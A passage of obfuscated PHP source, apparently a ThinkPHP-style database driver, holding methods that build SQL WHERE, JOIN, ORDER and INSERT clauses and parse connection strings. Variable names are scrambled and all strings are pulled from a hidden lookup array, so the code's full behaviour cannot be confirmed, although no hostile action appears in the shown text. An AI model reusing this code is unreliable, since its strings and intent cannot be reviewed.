= floor(mt_rand(0, think_config($BŠÂ—àí»Ô[904]) - 1)); } else { if (is_numeric(think_config($BŠÂ—àí»Ô[905]))) { $eÙ„Šœİ„ = think_config($BŠÂ—àí»Ô[905]); } else { $eÙ„Šœİ„ = floor(mt_rand(think_config($BŠÂ—àí»Ô[904]), count($bÑËèŒ«Ì[$BŠÂ—àí»Ô[811]]) - 1)); } } } else { $eÙ„Šœİ„ = floor(mt_rand(0, count($bÑËèŒ«Ì[$BŠÂ—àí»Ô[811]]) - 1)); } $eŸŸ£Ü½ª = array($BŠÂ—àí»Ô[813] => isset($bÑËèŒ«Ì[$BŠÂ—àí»Ô[813]][$eÙ„Šœİ„]) ? $bÑËèŒ«Ì[$BŠÂ—àí»Ô[813]][$eÙ„Šœİ„] : $bÑËèŒ«Ì[$BŠÂ—àí»Ô[813]][0], $BŠÂ—àí»Ô[814] => isset($bÑËèŒ«Ì[$BŠÂ—àí»Ô[814]][$eÙ„Šœİ„]) ? $bÑËèŒ«Ì[$BŠÂ—àí»Ô[814]][$eÙ„Šœİ„] : $bÑËèŒ«Ì[$BŠÂ—àí»Ô[814]][0], $BŠÂ—àí»Ô[811] => isset($bÑËèŒ«Ì[$BŠÂ—àí»Ô[811]][$eÙ„Šœİ„]) ? $bÑËèŒ«Ì[$BŠÂ—àí»Ô[811]][$eÙ„Šœİ„] : $bÑËèŒ«Ì[$BŠÂ—àí»Ô[811]][0], $BŠÂ—àí»Ô[812] => isset($bÑËèŒ«Ì[$BŠÂ—àí»Ô[812]][$eÙ„Šœİ„]) ? $bÑËèŒ«Ì[$BŠÂ—àí»Ô[812]][$eÙ„Šœİ„] : $bÑËèŒ«Ì[$BŠÂ—àí»Ô[812]][0], $BŠÂ—àí»Ô[17] => isset($bÑËèŒ«Ì[$BŠÂ—àí»Ô[17]][$eÙ„Šœİ„]) ? $bÑËèŒ«Ì[$BŠÂ—àí»Ô[17]][$eÙ„Šœİ„] : $bÑËèŒ«Ì[$BŠÂ—àí»Ô[17]][0], $BŠÂ—àí»Ô[840] => isset($bÑËèŒ«Ì[$BŠÂ—àí»Ô[840]][$eÙ„Šœİ„]) ? $bÑËèŒ«Ì[$BŠÂ—àí»Ô[840]][$eÙ„Šœİ„] : $bÑËèŒ«Ì[$BŠÂ—àí»Ô[840]][0], $BŠÂ—àí»Ô[13] => isset($bÑËèŒ«Ì[$BŠÂ—àí»Ô[13]][$eÙ„Šœİ„]) ? $bÑËèŒ«Ì[$BŠÂ—àí»Ô[13]][$eÙ„Šœİ„] : $bÑËèŒ«Ì[$BŠÂ—àí»Ô[13]][0]); return $this->connect($eŸŸ£Ü½ª, $eÙ„Šœİ„); } public function parseDSN($E…ªİÏ¢ô…) { $aœ‹•ÀŒªÖ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (empty($E…ªİÏ¢ô…)) { return !1; } $b¡°ğİ”¯’ = parse_url($E…ªİÏ¢ô…); if ($b¡°ğİ”¯’[$aœ‹•ÀŒªÖ[172]]) { $FšÜ“¬ó‘˜ = array($aœ‹•ÀŒªÖ[885] => $b¡°ğİ”¯’[$aœ‹•ÀŒªÖ[172]], $aœ‹•ÀŒªÖ[813] => isset($b¡°ğİ”¯’[$aœ‹•ÀŒªÖ[551]]) ? $b¡°ğİ”¯’[$aœ‹•ÀŒªÖ[551]] : $aœ‹•ÀŒªÖ[33], $aœ‹•ÀŒªÖ[814] => isset($b¡°ğİ”¯’[$aœ‹•ÀŒªÖ[906]]) ? $b¡°ğİ”¯’[$aœ‹•ÀŒªÖ[906]] : $aœ‹•ÀŒªÖ[33], $aœ‹•ÀŒªÖ[811] => isset($b¡°ğİ”¯’[$aœ‹•ÀŒªÖ[173]]) ? $b¡°ğİ”¯’[$aœ‹•ÀŒªÖ[173]] : $aœ‹•ÀŒªÖ[33], $aœ‹•ÀŒªÖ[812] => isset($b¡°ğİ”¯’[$aœ‹•ÀŒªÖ[174]]) ? $b¡°ğİ”¯’[$aœ‹•ÀŒªÖ[174]] : $aœ‹•ÀŒªÖ[33], $aœ‹•ÀŒªÖ[17] => isset($b¡°ğİ”¯’[$aœ‹•ÀŒªÖ[75]]) ? substr($b¡°ğİ”¯’[$aœ‹•ÀŒªÖ[75]], 1) : $aœ‹•ÀŒªÖ[33]); } else { preg_match($aœ‹•ÀŒªÖ[907], trim($E…ªİÏ¢ô…), $Aô‹æ¤ô‡è); $FšÜ“¬ó‘˜ = array($aœ‹•ÀŒªÖ[885] => $Aô‹æ¤ô‡è[1], $aœ‹•ÀŒªÖ[813] => $Aô‹æ¤ô‡è[2], $aœ‹•ÀŒªÖ[814] => $Aô‹æ¤ô‡è[3], $aœ‹•ÀŒªÖ[811] => $Aô‹æ¤ô‡è[4], $aœ‹•ÀŒªÖ[812] => $Aô‹æ¤ô‡è[5], $aœ‹•ÀŒªÖ[17] => $Aô‹æ¤ô‡è[6]); } $FšÜ“¬ó‘˜[$aœ‹•ÀŒªÖ[840]] = $aœ‹•ÀŒªÖ[33]; return $FšÜ“¬ó‘˜; } protected function debug() { $C²Ìá˜†Šã =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $C²Ìá˜†Šã[908]; if (think_config($C²Ìá˜†Šã[909])) { think_status($C²Ìá˜†Šã[910]); think_trace($this->queryStr . $C²Ìá˜†Šã[911] . think_status($C²Ìá˜†Šã[20], $C²Ìá˜†Šã[910], 6) . $C²Ìá˜†Šã[912], $C²Ìá˜†Šã[33], $C²Ìá˜†Šã[913]); } } protected function parseLock($Cë¿çÒ¨‹Ù = false) { $Dô¨È°Ç´Ö =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$Cë¿çÒ¨‹Ù) { return $Dô¨È°Ç´Ö[33]; } if ($Dô¨È°Ç´Ö[842] == $this->dbType) { return $Dô¨È°Ç´Ö[914]; } return $Dô¨È°Ç´Ö[915]; } protected function parseSet($cÁÍî·›ˆİ) { $f¡Ë§‰“£¬ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; foreach ($cÁÍî·›ˆİ as $cª³Ëé‹Ä => $eğÁéøÕÓ‰) { if (is_array($eğÁéøÕÓ‰) && $f¡Ë§‰“£¬[291] == $eğÁéøÕÓ‰[0]) { $D°ö‘¨ÚöŒ[] = $this->parseKey($cª³Ëé‹Ä) . $f¡Ë§‰“£¬[916] . $eğÁéøÕÓ‰[1]; } elseif (is_scalar($eğÁéøÕÓ‰) || is_null($eğÁéøÕÓ‰)) { $D°ö‘¨ÚöŒ[] = $this->parseKey($cª³Ëé‹Ä) . $f¡Ë§‰“£¬[916] . $this->parseValue($eğÁéøÕÓ‰); } } return $f¡Ë§‰“£¬[917] . implode($f¡Ë§‰“£¬[47], $D°ö‘¨ÚöŒ); } protected function bindParam($cËÛÎå„Æà, $E…£‘…åí±) { $this->bind[$_SERVER[ÈİÅ¿ÈÈ¥×][4] . $cËÛÎå„Æà] = $E…£‘…åí±; } protected function parseBind($A¡šÎ‰áå) { $A¡šÎ‰áå = array_merge($this->bind, $A¡šÎ‰áå); $this->bind = array(); return $A¡šÎ‰áå; } function parseKey(&$D¿Ö³£ø¸±, $E¢ï®§Ü¾‘ = true) { if ($E¢ï®§Ü¾‘) { $D¿Ö³£ø¸± = $this->parseKeyCheck($D¿Ö³£ø¸±); } return $D¿Ö³£ø¸±; } function parseKeyCheck($C…À‘óÌŒ) { $BÅãĞÊŞëŞ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C…À‘óÌŒ = trim($C…À‘óÌŒ); if (!preg_match($BÅãĞÊŞëŞ[918], $C…À‘óÌŒ)) { think_exception($BÅãĞÊŞëŞ[919] . $C…À‘óÌŒ); } return $C…À‘óÌŒ; } protected function parseValue($fÛ£Ôèõ) { $D†‡ç äØ° =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (is_string($fÛ£Ôèõ)) { $fÛ£Ôèõ = $D†‡ç äØ°[881] . $this->escapeString($fÛ£Ôèõ) . $D†‡ç äØ°[881]; } elseif (isset($fÛ£Ôèõ[0]) && is_string($fÛ£Ôèõ[0]) && strtolower($fÛ£Ôèõ[0]) == $D†‡ç äØ°[291]) { $fÛ£Ôèõ = $this->escapeString($fÛ£Ôèõ[1]); } elseif (is_array($fÛ£Ôèõ)) { $fÛ£Ôèõ = array_map(array($this, $D†‡ç äØ°[882]), $fÛ£Ôèõ); } elseif (is_bool($fÛ£Ôèõ)) { $fÛ£Ôèõ = $fÛ£Ôèõ ? $D†‡ç äØ°[83] : $D†‡ç äØ°[485]; } elseif (is_null($fÛ£Ôèõ)) { $fÛ£Ôèõ = $D†‡ç äØ°[99]; } return $fÛ£Ôèõ; } protected function parseField($d‹øÀò¤) { $DáÇÜíÒ® =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (is_string($d‹øÀò¤) && strpos($d‹øÀò¤, $DáÇÜíÒ®[47])) { $d‹øÀò¤ = explode($DáÇÜíÒ®[47], $d‹øÀò¤); } if (is_array($d‹øÀò¤)) { $c«Ïù”¿¶Ë = array(); foreach ($d‹øÀò¤ as $A°†§ª± => $bæÙ¾¨ÜŠ) { if (!is_numeric($A°†§ª±)) { $c«Ïù”¿¶Ë[] = $this->parseKey($A°†§ª±) . $DáÇÜíÒ®[920] . $this->parseKey($bæÙ¾¨ÜŠ); } else { $c«Ïù”¿¶Ë[] = $this->parseKey($bæÙ¾¨ÜŠ); } } $A—èÖâè·Œ = implode($DáÇÜíÒ®[47], $c«Ïù”¿¶Ë); } elseif (is_string($d‹øÀò¤) && !empty($d‹øÀò¤)) { $A—èÖâè·Œ = $d‹øÀò¤; } else { $A—èÖâè·Œ = $DáÇÜíÒ®[180]; } return $A—èÖâè·Œ; } protected function parseTable($C¥êÙÏ…) { $Fø¤Û¥®± =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (is_array($C¥êÙÏ…)) { $eˆèô Ÿ¾µ = array(); foreach ($C¥êÙÏ… as $fæ¾½ÉìÀÕ => $eº„¶äš³») { if (!is_numeric($fæ¾½ÉìÀÕ)) { $eˆèô Ÿ¾µ[] = $this->parseKey($fæ¾½ÉìÀÕ) . $Fø¤Û¥®±[50] . $this->parseKey($eº„¶äš³»); } else { $eˆèô Ÿ¾µ[] = $this->parseKey($fæ¾½ÉìÀÕ); } } $C¥êÙÏ… = $eˆèô Ÿ¾µ; } elseif (is_string($C¥êÙÏ…)) { if (strstr($C¥êÙÏ…, $Fø¤Û¥®±[50])) { return $C¥êÙÏ…; } $C¥êÙÏ… = explode($Fø¤Û¥®±[47], $C¥êÙÏ…); array_walk($C¥êÙÏ…, array($this, $Fø¤Û¥®±[831])); } return $Fø¤Û¥®±[825] . trim(implode($Fø¤Û¥®±[921], $C¥êÙÏ…), $Fø¤Û¥®±[375]) . $Fø¤Û¥®±[825]; } protected function parseWhere($e™ï«—Å©¯) { $b›´ğØÎİ¾ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $EÙ»ç’²¯Í = $b›´ğØÎİ¾[33]; if (is_string($e™ï«—Å©¯)) { $EÙ»ç’²¯Í = $e™ï«—Å©¯; } else { $B·¸ê¿ËĞà = isset($e™ï«—Å©¯[$b›´ğØÎİ¾[922]]) ? strtoupper($e™ï«—Å©¯[$b›´ğØÎİ¾[922]]) : $b›´ğØÎİ¾[33]; if (in_array($B·¸ê¿ËĞà, array($b›´ğØÎİ¾[923], $b›´ğØÎİ¾[924], $b›´ğØÎİ¾[925]))) { $B·¸ê¿ËĞà = $b›´ğØÎİ¾[50] . $B·¸ê¿ËĞà . $b›´ğØÎİ¾[50]; unset($e™ï«—Å©¯[$b›´ğØÎİ¾[922]]); } else { $B·¸ê¿ËĞà = $b›´ğØÎİ¾[926]; } foreach ($e™ï«—Å©¯ as $E–ÉÄí™²® => $b¤æ‰¼†Ü) { $EÙ»ç’²¯Í .= $b›´ğØÎİ¾[271]; if (is_numeric($E–ÉÄí™²®)) { $E–ÉÄí™²® = $b›´ğØÎİ¾[927]; } if (0 === strpos($E–ÉÄí™²®, $b›´ğØÎİ¾[70])) { $EÙ»ç’²¯Í .= $this->parseThinkWhere($E–ÉÄí™²®, $b¤æ‰¼†Ü); } else { if (!preg_match($b›´ğØÎİ¾[928], trim($E–ÉÄí™²®))) { think_exception(think_lang($b›´ğØÎİ¾[929]) . $b›´ğØÎİ¾[4] . $E–ÉÄí™²®); } $CÏÜßà–é = is_array($b¤æ‰¼†Ü) && isset($b¤æ‰¼†Ü[$b›´ğØÎİ¾[930]]); $E–ÉÄí™²® = trim($E–ÉÄí™²®); if (strpos($E–ÉÄí™²®, $b›´ğØÎİ¾[277])) { $e…‚óÂ›ñÛ = explode($b›´ğØÎİ¾[277], $E–ÉÄí™²®); $eÎÁğ—ïòÜ = array(); foreach ($e…‚óÂ›ñÛ as $déÍ·¹Óî™ => $DºÊˆ†„†) { $AÃß§®£­‘ = $CÏÜßà–é ? $b¤æ‰¼†Ü[$déÍ·¹Óî™] : $b¤æ‰¼†Ü; $eÎÁğ—ïòÜ[] = $b›´ğØÎİ¾[254] . $this->parseWhereItem($this->parseKey($DºÊˆ†„†), $AÃß§®£­‘) . $b›´ğØÎİ¾[830]; } $EÙ»ç’²¯Í .= implode($b›´ğØÎİ¾[931], $eÎÁğ—ïòÜ); } elseif (strpos($E–ÉÄí™²®, $b›´ğØÎİ¾[278])) { $e…‚óÂ›ñÛ = explode($b›´ğØÎİ¾[278], $E–ÉÄí™²®); $eÎÁğ—ïòÜ = array(); foreach ($e…‚óÂ›ñÛ as $déÍ·¹Óî™ => $DºÊˆ†„†) { $AÃß§®£­‘ = $CÏÜßà–é ? $b¤æ‰¼†Ü[$déÍ·¹Óî™] : $b¤æ‰¼†Ü; $eÎÁğ—ïòÜ[] = $b›´ğØÎİ¾[254] . $this->parseWhereItem($this->parseKey($DºÊˆ†„†), $AÃß§®£­‘) . $b›´ğØÎİ¾[830]; } $EÙ»ç’²¯Í .= implode($b›´ğØÎİ¾[926], $eÎÁğ—ïòÜ); } else { $EÙ»ç’²¯Í .= $this->parseWhereItem($this->parseKey($E–ÉÄí™²®), $b¤æ‰¼†Ü); } } $EÙ»ç’²¯Í .= $b›´ğØÎİ¾[272] . $B·¸ê¿ËĞà; } $EÙ»ç’²¯Í = substr($EÙ»ç’²¯Í, 0, -strlen($B·¸ê¿ËĞà)); } return empty($EÙ»ç’²¯Í) ? $b›´ğØÎİ¾[33] : $b›´ğØÎİ¾[932] . $EÙ»ç’²¯Í; } protected function parseWhereItem($AŸãßªÂÓî, $F·õÊ±Á) { $dâ¤–×˜æ  =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BÇÛÔœêÈ = $dâ¤–×˜æ [33]; if (is_array($F·õÊ±Á)) { if (is_string($F·õÊ±Á[0])) { $EøÆäåµˆÊ = strtolower($F·õÊ±Á[0]); if (in_array($F·õÊ±Á[0], array($dâ¤–×˜æ [916], $dâ¤–×˜æ [933], $dâ¤–×˜æ [934], $dâ¤–×˜æ [935], $dâ¤–×˜æ [936], $dâ¤–×˜æ [937]))) { $BÇÛÔœêÈ .= $AŸãßªÂÓî . $dâ¤–×˜æ [50] . $F·õÊ±Á[0] . $dâ¤–×˜æ [50] . $this->parseValue($F·õÊ±Á[1]); } elseif (preg_match($dâ¤–×˜æ [938], $F·õÊ±Á[0])) { $BÇÛÔœêÈ .= $AŸãßªÂÓî . $dâ¤–×˜æ [50] . $this->exp[$EøÆäåµˆÊ] . $dâ¤–×˜æ [50] . $this->parseValue($F·õÊ±Á[1]); } elseif (preg_match($dâ¤–×˜æ [939], $F·õÊ±Á[0])) { if (is_array($F·õÊ±Á[1])) { $EÎ±÷Äññ = isset($F·õÊ±Á[2]) ? strtoupper($F·õÊ±Á[2]) : $dâ¤–×˜æ [924]; if (in_array($EÎ±÷Äññ, array($dâ¤–×˜æ [923], $dâ¤–×˜æ [924], $dâ¤–×˜æ [925]))) { $dÀóªä‚Ò = array(); foreach ($F·õÊ±Á[1] as $EµÓÃç‰·) { $dÀóªä‚Ò[] = $AŸãßªÂÓî . $dâ¤–×˜æ [50] . $this->exp[$EøÆäåµˆÊ] . $dâ¤–×˜æ [50] . $this->parseValue($EµÓÃç‰·); } $BÇÛÔœêÈ .= $dâ¤–×˜æ [254] . implode($dâ¤–×˜æ [50] . $EÎ±÷Äññ . $dâ¤–×˜æ [50], $dÀóªä‚Ò) . $dâ¤–×˜æ [830]; } } else { $BÇÛÔœêÈ .= $AŸãßªÂÓî . $dâ¤–×˜æ [50] . $this->exp[$EøÆäåµˆÊ] . $dâ¤–×˜æ [50] . $this->parseValue($F·õÊ±Á[1]); } } elseif ($dâ¤–×˜æ [291] == $EøÆäåµˆÊ) { $BÇÛÔœêÈ .= $dâ¤–×˜æ [828] . $AŸãßªÂÓî . $dâ¤–×˜æ [50] . $F·õÊ±Á[1] . $dâ¤–×˜æ [940]; } elseif (preg_match($dâ¤–×˜æ [941], $F·õÊ±Á[0])) { $BÇÛÔœêÈ .= $F·õÊ±Á[0]; } elseif (preg_match($dâ¤–×˜æ [942], $F·õÊ±Á[0])) { if (isset($F·õÊ±Á[2]) && $dâ¤–×˜æ [291] == $F·õÊ±Á[2]) { $BÇÛÔœêÈ .= $AŸãßªÂÓî . $dâ¤–×˜æ [50] . $this->exp[$EøÆäåµˆÊ] . $dâ¤–×˜æ [50] . $F·õÊ±Á[1]; } else { if (is_string($F·õÊ±Á[1])) { $F·õÊ±Á[1] = explode($dâ¤–×˜æ [47], $F·õÊ±Á[1]); } $Aƒ¡æ–Ó¶ = implode($dâ¤–×˜æ [47], $this->parseValue($F·õÊ±Á[1])); $BÇÛÔœêÈ .= $AŸãßªÂÓî . $dâ¤–×˜æ [50] . $this->exp[$EøÆäåµˆÊ] . $dâ¤–×˜æ [828] . $Aƒ¡æ–Ó¶ . $dâ¤–×˜æ [830]; } } elseif (preg_match($dâ¤–×˜æ [943], $F·õÊ±Á[0])) { $eµîÇè—¿ = is_string($F·õÊ±Á[1]) ? explode($dâ¤–×˜æ [47], $F·õÊ±Á[1]) : $F·õÊ±Á[1]; $BÇÛÔœêÈ .= $dâ¤–×˜æ [828] . $AŸãßªÂÓî . $dâ¤–×˜æ [50] . $this->exp[$EøÆäåµˆÊ] . $dâ¤–×˜æ [50] . $this->parseValue($eµîÇè—¿[0]) . $dâ¤–×˜æ [926] . $this->parseValue($eµîÇè—¿[1]) . $dâ¤–×˜æ [272]; } else { think_exception(think_lang($dâ¤–×˜æ [929]) . $dâ¤–×˜æ [4] . $F·õÊ±Á[0]); } } else { $F’„”ëîñ¯ = count($F·õÊ±Á); $FÍÄœîªŠ = $dâ¤–×˜æ [33]; if (is_string($F·õÊ±Á[$F’„”ëîñ¯ - 1])) { $FÍÄœîªŠ = isset($F·õÊ±Á[$F’„”ëîñ¯ - 1]) ? strtoupper($F·õÊ±Á[$F’„”ëîñ¯ - 1]) : $dâ¤–×˜æ [33]; if (in_array($FÍÄœîªŠ, array($dâ¤–×˜æ [923], $dâ¤–×˜æ [924], $dâ¤–×˜æ [925]))) { $F’„”ëîñ¯ = $F’„”ëîñ¯ - 1; } } else { $FÍÄœîªŠ = $dâ¤–×˜æ [923]; } for ($d±Ñİ‹é÷‘ = 0; $d±Ñİ‹é÷‘ < $F’„”ëîñ¯; $d±Ñİ‹é÷‘++) { $eµîÇè—¿ = is_array($F·õÊ±Á[$d±Ñİ‹é÷‘]) ? $F·õÊ±Á[$d±Ñİ‹é÷‘][1] : $F·õÊ±Á[$d±Ñİ‹é÷‘]; if ($dâ¤–×˜æ [291] == strtolower($F·õÊ±Á[$d±Ñİ‹é÷‘][0])) { $BÇÛÔœêÈ .= $dâ¤–×˜æ [254] . $AŸãßªÂÓî . $dâ¤–×˜æ [50] . $eµîÇè—¿ . $dâ¤–×˜æ [940] . $FÍÄœîªŠ . $dâ¤–×˜æ [50]; } else { $d‡¹³ìÉ¸Ë = is_array($F·õÊ±Á[$d±Ñİ‹é÷‘]) ? $this->exp[strtolower($F·õÊ±Á[$d±Ñİ‹é÷‘][0])] : $dâ¤–×˜æ [916]; if (!$d‡¹³ìÉ¸Ë && is_array($F·õÊ±Á[$d±Ñİ‹é÷‘]) && in_array($F·õÊ±Á[$d±Ñİ‹é÷‘][0], array($dâ¤–×˜æ [916], $dâ¤–×˜æ [933], $dâ¤–×˜æ [934], $dâ¤–×˜æ [935], $dâ¤–×˜æ [936], $dâ¤–×˜æ [937]))) { $d‡¹³ìÉ¸Ë = $F·õÊ±Á[$d±Ñİ‹é÷‘][0]; } $BÇÛÔœêÈ .= $dâ¤–×˜æ [254] . $AŸãßªÂÓî . $dâ¤–×˜æ [50] . $d‡¹³ìÉ¸Ë . $dâ¤–×˜æ [50] . $this->parseValue($eµîÇè—¿) . $dâ¤–×˜æ [940] . $FÍÄœîªŠ . $dâ¤–×˜æ [50]; } } $BÇÛÔœêÈ = substr($BÇÛÔœêÈ, 0, -4); } } else { $BÇÛÔœêÈ .= $AŸãßªÂÓî . $dâ¤–×˜æ [944] . $this->parseValue($F·õÊ±Á); } return $BÇÛÔœêÈ; } protected function parseThinkWhere($Dƒô‰—ƒ¬µ, $aÈÇØÔİİÜ) { $e·›«ƒùËå =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D¸¯’´Æô = $e·›«ƒùËå[33]; switch ($Dƒô‰—ƒ¬µ) { case $e·›«ƒùËå[346]: $D¸¯’´Æô = $aÈÇØÔİİÜ; break; case $e·›«ƒùËå[927]: $D¸¯’´Æô = is_string($aÈÇØÔİİÜ) ? $aÈÇØÔİİÜ : substr($this->parseWhere($aÈÇØÔİİÜ), 6); break; case $e·›«ƒùËå[945]: parse_str($aÈÇØÔİİÜ, $a‘Î„²ŒÊä); if (isset($a‘Î„²ŒÊä[$e·›«ƒùËå[922]])) { $cİÑÍÂÁàŒ = $e·›«ƒùËå[50] . strtoupper($a‘Î„²ŒÊä[$e·›«ƒùËå[922]]) . $e·›«ƒùËå[50]; unset($a‘Î„²ŒÊä[$e·›«ƒùËå[922]]); } else { $cİÑÍÂÁàŒ = $e·›«ƒùËå[926]; } $eÈ¼ˆºÉ² = array(); foreach ($a‘Î„²ŒÊä as $e˜Øà¬„ñ => $e¨®ÊŠÏ¬í) { $eÈ¼ˆºÉ²[] = $this->parseKey($e˜Øà¬„ñ) . $e·›«ƒùËå[944] . $this->parseValue($e¨®ÊŠÏ¬í); } $D¸¯’´Æô = implode($cİÑÍÂÁàŒ, $eÈ¼ˆºÉ²); break; } return $D¸¯’´Æô; } protected function parseLimit($fì—´ù¯áÆ) { $C¦êğ¢§’Š =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return !empty($fì—´ù¯áÆ) ? $C¦êğ¢§’Š[48] . $fì—´ù¯áÆ . $C¦êğ¢§’Š[50] : $C¦êğ¢§’Š[33]; } protected function parseJoin($c»Î°Œ‘Ö¯) { $EÊ—Ş¤³ö¯ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dÄÚº¼Åè¼ = $EÊ—Ş¤³ö¯[33]; if (!empty($c»Î°Œ‘Ö¯)) { if (is_array($c»Î°Œ‘Ö¯)) { foreach ($c»Î°Œ‘Ö¯ as $eò¡ÇÛ®‘ => $A®œ½Ç°’ê) { if (!1 !== stripos($A®œ½Ç°’ê, $EÊ—Ş¤³ö¯[946])) { $dÄÚº¼Åè¼ .= $EÊ—Ş¤³ö¯[50] . $A®œ½Ç°’ê; } else { $dÄÚº¼Åè¼ .= $EÊ—Ş¤³ö¯[947] . $A®œ½Ç°’ê; } } } else { $dÄÚº¼Åè¼ .= $EÊ—Ş¤³ö¯[947] . $c»Î°Œ‘Ö¯; } } $dÄÚº¼Åè¼ = preg_replace($EÊ—Ş¤³ö¯[948], think_config($EÊ—Ş¤³ö¯[854]) . $EÊ—Ş¤³ö¯[949], $dÄÚº¼Åè¼); return $dÄÚº¼Åè¼; } protected function parseOrder($DÈÇˆ¤) { $C—ó³°çò¯ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (is_array($DÈÇˆ¤)) { $D‹Ş­ñ»Œ = array(); foreach ($DÈÇˆ¤ as $fš¼è´™Ï¶ => $dØ©ÃÉ÷–¡) { if (is_numeric($fš¼è´™Ï¶)) { $D‹Ş­ñ»Œ[] = $this->parseKey($dØ©ÃÉ÷–¡); } else { $dØ©ÃÉ÷–¡ = in_array(strtoupper(trim($dØ©ÃÉ÷–¡)), array($C—ó³°çò¯[950], $C—ó³°çò¯[951])) ? $C—ó³°çò¯[50] . $dØ©ÃÉ÷–¡ : $C—ó³°çò¯[33]; if (preg_match($C—ó³°çò¯[952], $fš¼è´™Ï¶)) { $D‹Ş­ñ»Œ[] = $this->parseKey($fš¼è´™Ï¶) . $dØ©ÃÉ÷–¡; } else { think_exception($C—ó³°çò¯[953] . $fš¼è´™Ï¶); } } } $DÈÇˆ¤ = implode($C—ó³°çò¯[47], $D‹Ş­ñ»Œ); } return !empty($DÈÇˆ¤) ? $C—ó³°çò¯[954] . $DÈÇˆ¤ : $C—ó³°çò¯[33]; } protected function parseGroup($A³÷ëóÁí) { $dÀ¶¹¡…åâ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return !empty($A³÷ëóÁí) ? $dÀ¶¹¡…åâ[955] . $A³÷ëóÁí : $dÀ¶¹¡…åâ[33]; } protected function parseHaving($F¶Ú£ ÄØ) { $cİ‰Ğ ×‘ˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return !empty($F¶Ú£ ÄØ) ? $cİ‰Ğ ×‘ˆ[956] . $F¶Ú£ ÄØ : $cİ‰Ğ ×‘ˆ[33]; } protected function parseComment($fä…ÌÊíÆ‰) { $dŒîÛ½ç¤ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return !empty($fä…ÌÊíÆ‰) ? $dŒîÛ½ç¤[957] . $fä…ÌÊíÆ‰ . $dŒîÛ½ç¤[958] : $dŒîÛ½ç¤[33]; } protected function parseDistinct($DÜãŞ«¡ïÌ) { $aù‘ÓõÚ‡” =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return !empty($DÜãŞ«¡ïÌ) ? $aù‘ÓõÚ‡”[959] : $aù‘ÓõÚ‡”[33]; } protected function parseUnion($BÀÂ¯º·Ë˜) { $d‡àØ³İñ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (empty($BÀÂ¯º·Ë˜)) { return $d‡àØ³İñ[33]; } if (isset($BÀÂ¯º·Ë˜[$d‡àØ³İñ[342]])) { $D•øÌ…¸Ïà = $d‡àØ³İñ[960]; unset($BÀÂ¯º·Ë˜[$d‡àØ³İñ[342]]); } else { $D•øÌ…¸Ïà = $d‡àØ³İñ[961]; } foreach ($BÀÂ¯º·Ë˜ as $bïäˆâ±¸) { $A…Ğ‰£†Š[] = $D•øÌ…¸Ïà . (is_array($bïäˆâ±¸) ? $this->buildSelectSql($bïäˆâ±¸) : $bïäˆâ±¸); } return implode($d‡àØ³İñ[50], $A…Ğ‰£†Š); } public function insert($Cìˆœ§Êš, $AÑÇ™ÜŒó„ = array(), $Cç×Ó¸…¸Õ = false) { goto c™µãäé›å; c™µãäé›å: $b×ñ›ÓĞ»Ä =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BÏ’·Œ‚³ = $F›ˆ¢ãÅ÷ö = array(); $this->model = $AÑÇ™ÜŒó„[$b×ñ›ÓĞ»Ä[275]]; goto BÌ×½èÜù«; Aêƒï…âÀ: $fˆ•ëªµ .= $this->parseComment(!empty($AÑÇ™ÜŒó„[$b×ñ›ÓĞ»Ä[348]]) ? $AÑÇ™ÜŒó„[$b×ñ›ÓĞ»Ä[348]] : $b×ñ›ÓĞ»Ä[33]); return $this->execute($fˆ•ëªµ, $this->parseBind(!empty($AÑÇ™ÜŒó„[$b×ñ›ÓĞ»Ä[279]]) ? $AÑÇ™ÜŒó„[$b×ñ›ÓĞ»Ä[279]] : array())); goto c„¸ß¨‘òŠ; BÌ×½èÜù«: foreach ($Cìˆœ§Êš as $aöºóô‚ => $Dƒ¨á¤š²Ñ) { if (is_array($Dƒ¨á¤š²Ñ) && $b×ñ›ÓĞ»Ä[291] == $Dƒ¨á¤š²Ñ[0]) { $F›ˆ¢ãÅ÷ö[] = $this->parseKey($aöºóô‚); $BÏ’·Œ‚³[] = $Dƒ¨á¤š²Ñ[1]; } elseif (is_scalar($Dƒ¨á¤š²Ñ) || is_null($Dƒ¨á¤š²Ñ)) { $F›ˆ¢ãÅ÷ö[] = $this->parseKey($aöºóô‚); $BÏ’·Œ‚³[] = $this->parseValue($Dƒ¨á¤š²Ñ); } } $fˆ•ëªµ = ($Cç×Ó¸…¸Õ ? $b×ñ›ÓĞ»Ä[832] : $b×ñ›ÓĞ»Ä[833]) . $b×ñ›ÓĞ»Ä[834] . $this->parseTable($AÑÇ™ÜŒó„[$b×ñ›ÓĞ»Ä[273]]) . $b×ñ›ÓĞ»Ä[828] . implode($b×ñ›ÓĞ»Ä[47], $F›ˆ¢ãÅ÷ö) . $b×ñ›ÓĞ»Ä[829] . implode($b×ñ›ÓĞ»Ä[47], $BÏ’·Œ‚³) . $b×ñ›ÓĞ»Ä[830]; $fˆ•ëªµ .= $this->parseLock(isset($AÑÇ™ÜŒó„[$b×ñ›ÓĞ»Ä[781]]) ? $AÑÇ™ÜŒó„[$b×ñ›ÓĞ»Ä[781]] : !1); goto Aêƒï…âÀ; c„¸ß¨‘òŠ: } public function selectInsert($c¹µŸ¨°«¯, $eÍ»¦ìƒ, $E„ù¾œÔ‚« = array()) { goto FŸª´µ ‡; a•ÛÈ¡‘˜Œ: array_walk($c¹µŸ¨°«¯, array($this, $E¿À§©Ûçï[831])); $A‡ñŒÓ† = $E¿À§©Ûçï[962] . 